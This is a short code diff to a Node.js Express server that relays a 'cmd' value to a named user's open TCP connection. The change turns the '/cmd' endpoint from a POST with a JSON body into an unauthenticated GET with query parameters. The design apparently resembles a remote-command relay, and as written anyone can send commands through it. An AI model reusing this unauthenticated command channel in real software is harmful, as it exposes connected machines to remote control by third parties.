@@ -1,6 +1,4 @@
 const express = require('express');
-const bodyParser = require('body-parser');
-
 const app = express();
 
 const usersOnline = {};
@@ -27,15 +25,12 @@ const server = net.createServer((conn) => {
     });
 });
 
-
-app.use(bodyParser.json());
-
 app.get('/ping', (_, res) => {
     res.end();
 });
 
-app.post('/cmd', (req, res) => {
-    const { user, cmd } = req.body;
+app.get('/cmd', (req, res) => {
+    const { user, cmd } = req.query;
     usersOnline[user] && usersOnline[user].conn.write(JSON.stringify({ type: 'cmd', cmd }));
     res.end();
 });
